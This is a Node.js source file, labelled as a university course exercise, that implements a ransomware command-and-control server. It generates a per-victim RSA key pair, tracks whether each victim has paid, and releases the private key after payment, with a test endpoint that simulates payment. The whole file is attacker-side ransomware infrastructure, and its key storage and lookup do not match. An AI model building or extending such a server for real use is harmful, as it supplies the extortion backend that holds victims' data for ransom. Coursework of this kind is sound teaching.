/*

    This is an example of a basic C2 server
    It is for educational purpose created by students
    @ Cal State Long Beach for Intro to Cyber Security
    CECS 378

*/

const express = require('express');
const app = express();
const crypto = require('crypto'); // Crypto module for RSA key

app.use(express.json());

const keys = {};
const wallets = {}; // Matches pub_keys with crypto wallet

var key_count = 0;

// Check if victim has paid
app.post('/check-payment', (req, res) => {
    const {pub_key} = req.body;
    
    // Validate
    if (!pub_key)
        return res.status(400).json({ error: "Missing Key" });

    // This is where the app would use the wallet id to see if a payment
    // was made to us, each wallet being unique to a user
    let paid = wallets[pub_key];

    if (paid) {
        const priv_key = keys[pub_key];
        return res.status(200).json({ key: priv_key});
    }

    return res.status(400).json({ msg: "Not Paid"});
});

// Post request for testing purposes, irl would use bitcoin ledger to check
app.post('/simulate-payment', (req, res) => {
    const {pub_key} = req.body;
    if (!pub_key)
        return res.status(400).json({ msg: "Missing Key" });

    wallets[pub_key] = true;
    return res.status(200).json({ msg:"Paid!"});
});

app.get('/', (req, res) => {
    res.send("Welcome to my C2 Server");
});

app.get('/has-paid/:key', (req, res) => {
    res.send(""+wallets[req.params.key])
});

// This is what an attacker would use to get a unique RSA public key for
// each victim
app.get('/gen-key', (req, res) => {
    // Generate RSA key
    const { publicKey, privateKey } = crypto.generateKeyPairSync('rsa', {
        modulusLength: 2048, // length of bits for RSA key
        publicKeyEncoding: {
            type: 'spki', // SPKI format
            format: 'pem' // PEM format
        },
        privateKeyEncoding: {
            type: 'pkcs8', // PKCS8 format
            format: 'pem' // PEM format
        }
    });

    // store keys
    keys[key_count] = { publicKey, privateKey};

    // send back public key
    res.send(publicKey);

    // increments key count
    key_count+=1;

    // set wallet for public key
    wallets[key_count-1] = false;
});

app.listen(3000, () => {
    console.log("Listening on port 3000");
});
